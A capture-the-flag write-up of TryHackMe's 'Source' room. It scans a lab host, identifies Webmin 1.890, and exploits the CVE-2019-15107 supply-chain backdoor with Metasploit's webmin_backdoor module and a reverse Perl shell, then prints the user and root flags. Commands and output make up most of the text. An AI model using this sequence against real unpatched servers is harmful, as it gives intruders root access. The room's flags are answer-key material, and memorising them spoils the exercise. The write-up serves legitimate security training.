<h3 align="center">TryHackMe - Source CTF</h3>

Room objectives: This write-up covers the Source room from TryHackMe, demonstrating host enumeration, service version identification, exploitation of a backdoored Webmin 1.890 instance, shell acquisition via Metasploit, and analysis of a supply-chain compromise vulnerability leading to root-level access.

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


As usual, the first step is service enumeration. I started with a quick scan using RustScan to identify open ports before performing a more detailed Nmap scan:

```
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.64.162.55 --ulimit=5000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Making sure 'closed' isn't just a state of mind.

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.64.162.55:22
Open 10.64.162.55:10000
```
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


Port 22 appears to be running SSH, while port 10000 is hosting an unknown service. To identify the technologies and versions in use, I performed a more detailed Nmap scan:

```
┌──(kali㉿kali)-[~]
└─$ nmap -A -sV -p 22,10000 10.64.162.55 -T4                               
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-01 21:30 EDT
Nmap scan report for 10.64.162.55
Host is up (0.13s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b7:4c:d0:bd:e2:7b:1b:15:72:27:64:56:29:15:ea:23 (RSA)
|   256 b7:85:23:11:4f:44:fa:22:00:8e:40:77:5e:cf:28:7c (ECDSA)
|_  256 a9:fe:4b:82:bf:89:34:59:36:5b:ec:da:c2:d3:95:ce (ED25519)
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
```
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


Found a web service called Webmin, with this login page at https://10.64.162.55/:10000

<img width="426" height="420" alt="image" src="https://github.com/user-attachments/assets/22aa5679-3a83-47a6-9b09-41969040c614" />

I tried searching for Webmin on Metasploit and here's what I found:

```
┌──(kali㉿kali)-[~]
└─$ msfconsole -q
msf > search webmin

Matching Modules
================

   #   Name                                           Disclosure Date  Rank       Check  Description
   -   ----                                           ---------------  ----       -----  -----------
   0   exploit/unix/webapp/webmin_show_cgi_exec       2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
   1   auxiliary/admin/webmin/file_disclosure         2006-06-30       normal     No     Webmin File Disclosure
   2   exploit/linux/http/webmin_file_manager_rce     2022-02-26       excellent  Yes    Webmin File Manager RCE
   3   exploit/linux/http/webmin_package_updates_rce  2022-07-26       excellent  Yes    Webmin Package Updates RCE
   4     \_ target: Unix In-Memory                    .                .          .      .
   5     \_ target: Linux Dropper (x86 & x64)         .                .          .      .
   6     \_ target: Linux Dropper (ARM64)             .                .          .      .
   7   exploit/linux/http/webmin_packageup_rce        2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
   8   exploit/unix/webapp/webmin_upload_exec         2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE
   9   auxiliary/admin/webmin/edit_html_fileaccess    2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
   10  exploit/linux/http/webmin_backdoor             2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
   11    \_ target: Automatic (Unix In-Memory)        .                .          .      .
   12    \_ target: Automatic (Linux Dropper)         .                .          .      .
```
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


I tried the info command to read the exploits and the first one I read (exploit/linux/http/webmin_backdoor), fits perfectly in our case because the vulnerable version is 1.890:

```
Description:
  This module exploits a backdoor in Webmin versions 1.890 through 1.920.
  Only the SourceForge downloads were backdoored, but they are listed as
  official downloads on the project's site.

  Unknown attacker(s) inserted Perl qx statements into the build server's
  source code on two separate occasions: once in April 2018, introducing
  the backdoor in the 1.890 release, and in July 2018, reintroducing the
  backdoor in releases 1.900 through 1.920.

  Only version 1.890 is exploitable in the default install. Later affected
  versions require the expired password changing feature to be enabled.
```
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


Typing show missing command will shows us the required parameters: 

```
  [*] Using configured payload cmd/unix/reverse_perl
msf exploit(linux/http/webmin_backdoor) > show missing

Module options (exploit/linux/http/webmin_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
```
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Let's fill up the RHOSTS with target IP and LHOST with our localhost, in this case it's TryHackMe VPN tunnel:

```
msf exploit(linux/http/webmin_backdoor) > set LHOST tun0
LHOST => 192.168.140.135
```

```
msf exploit(linux/http/webmin_backdoor) > set RHOSTS 10.64.162.55
RHOSTS => 10.64.162.55
```
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


Then, let's run:
```
msf exploit(linux/http/webmin_backdoor) > run
[*] Started reverse TCP handler on 192.168.140.135:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[-] Exploit failed: Errno::ENOTCONN Transport endpoint is not connected - getpeername(2)
[*] Exploit completed, but no session was created.
msf exploit(linux/http/webmin_backdoor) > run
[*] Started reverse TCP handler on 192.168.140.135:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[-] Please enable the SSL option to proceed
[-] Exploit aborted due to failure: unknown: Cannot reliably check exploitability. "set ForceExploit true" to override check result.
[*] Exploit completed, but no session was created.
```
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Didn't work, let's run "set ForceExploit true" as suggested to see if something changes:

```
msf exploit(linux/http/webmin_backdoor) > set ForceExploit true
ForceExploit => true
msf exploit(linux/http/webmin_backdoor) > run
[*] Started reverse TCP handler on 192.168.140.135:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[-] Please enable the SSL option to proceed
[!] Cannot reliably check exploitability. ForceExploit is enabled, proceeding with exploitation.
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[-] Exploit failed: Errno::ENOTCONN Transport endpoint is not connected - getpeername(2)
[*] Exploit completed, but no session was created.
```
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Ok, the error persists but this time I saw the message asking to enable SSL option, let's try...

```
msf exploit(linux/http/webmin_backdoor) > set SSL true
[!] Changing the SSL option's value may require changing RPORT!
SSL => true
msf exploit(linux/http/webmin_backdoor) > run
[*] Started reverse TCP handler on 192.168.140.135:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 1 opened (192.168.140.135:4444 -> 10.64.162.55:51442) at 2026-06-01 21:39:56 -0400
```
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

The exploit was successful and returned a shell. To improve terminal interaction, I upgraded it using Python and tested:

```
python -c 'import pty; pty.spawn("/bin/bash")'
root@source:/usr/share/webmin/# ls
```

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Great! We are already root user! We don't even need to escalate privileges, so let's just search for the files requested:

```
root@source:/usr/share/webmin# find / -name "user.txt"
find / -name "user.txt"
/home/dark/user.txt
root@source:/usr/share/webmin# cat /home/dark/user.txt
cat /home/dark/user.txt
THM{SUPPLY_CHAIN_COMPROMISE}
```

user.txt: THM{SUPPLY_CHAIN_COMPROMISE}

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


```
root@source:/usr/share/webmin# find / -name "root.txt"
find / -name "root.txt"
/root/root.txt
root@source:/usr/share/webmin# cat /root/root.txt
cat /root/root.txt
THM{UPDATE_YOUR_INSTALL}
```

root.txt: THM{UPDATE_YOUR_INSTALL}

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


The machine was vulnerable to CVE-2019-15107, a backdoor that was intentionally inserted into specific Webmin releases during a supply-chain compromise.

Affected versions include:

1.890
1.900–1.920 (under specific conditions)

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


  


